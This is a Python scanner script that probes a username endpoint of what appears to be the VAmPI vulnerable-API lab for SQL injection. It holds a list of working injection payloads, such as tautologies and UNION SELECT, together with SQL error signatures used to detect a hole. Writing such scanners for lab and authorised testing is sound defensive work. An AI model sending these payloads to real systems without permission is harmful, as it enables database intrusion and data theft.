
#!/usr/bin/env python3
"""
SQL Injection Test Script
Target: GET /users/v1/{username}
Base URL: http://localhost:5002

This script tests the /users/v1/{username} endpoint for SQL Injection vulnerabilities.
It first performs a baseline request using a normal username, then iterates through several
SQL injection payloads. The script checks for SQL error indicators as well as differences
in response content compared to the baseline.

Techniques inspired by:
- https://zerodayhacker.com/vampi-walkthrough/
- https://blog.held.codes/vampi-vulnerable-api-write-up-and-walk-through-3cce519e5e96
- https://pentestguy.com/vampi-vulnerable-rest-api-walkthrough/
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from base_scanner import BaseScanner
from RAGScripts.utils.logger import setup_scanner_logger

class SQLInjectionScanner(BaseScanner):
    def run(self):
        # Define a normal (baseline) username and get its response
        normal_username = "name1"
        endpoint = f"/users/v1/{normal_username}"
        
        try:
            baseline_response = self.make_request("GET", endpoint)
            baseline_request, baseline_response_data = self.capture_transaction(baseline_response)
            baseline_body = baseline_response.text

            # List of SQL injection payloads to try
            sql_payloads = [
                "name1' OR '1'='1",
                "name1' OR 1=1 -- ",
                "name1' OR 'a'='a",
                "name1' UNION SELECT null, null -- ",
                "name1' OR 1=1#"
            ]

            # Common SQL error indicators
            error_indicators = [
                "SQL syntax",
                "mysql_fetch",
                "ORA-",
                "SQLSTATE",
                "Warning:"
            ]

            for payload in sql_payloads:
                self.logger.info(f"Testing SQL injection payload: {payload}")
                test_endpoint = f"/users/v1/{payload}"
                
                try:
                    response = self.make_request("GET", test_endpoint)
                    request_data, response_data = self.capture_transaction(response)
                    
                    # Check for SQL error messages
                    if any(indicator.lower() in response.text.lower() for indicator in error_indicators):
                        self.add_finding(
                            title="Potential SQL Injection Vulnerability",
                            description=f"SQL error indicators found in response when testing payload: {payload}",
                            endpoint=test_endpoint,
                            severity_level="tier2",
                            impact="Potential database exposure and unauthorized data access",
                            request=request_data,
                            response=response_data,
                            remediation="Implement proper input validation and parameterized queries"
                        )
                        continue

                    # Compare response with baseline
                    if response.text != baseline_body:
                        self.add_finding(
                            title="Potential SQL Injection - Different Response",
                            description=f"Response differs from baseline when testing payload: {payload}",
                            endpoint=test_endpoint,
                            severity_level="tier2",
                            impact="Potential SQL injection vulnerability detected",
                            request=request_data,
                            response=response_data,
                            remediation="Implement proper input validation and parameterized queries"
                        )

                except Exception as e:
                    self.logger.error(f"Error testing payload {payload}: {str(e)}")

        except Exception as e:
            self.logger.error(f"Error during SQL injection testing: {str(e)}")
            raise

if __name__ == "__main__":
    scanner = SQLInjectionScanner()
    scanner.execute()
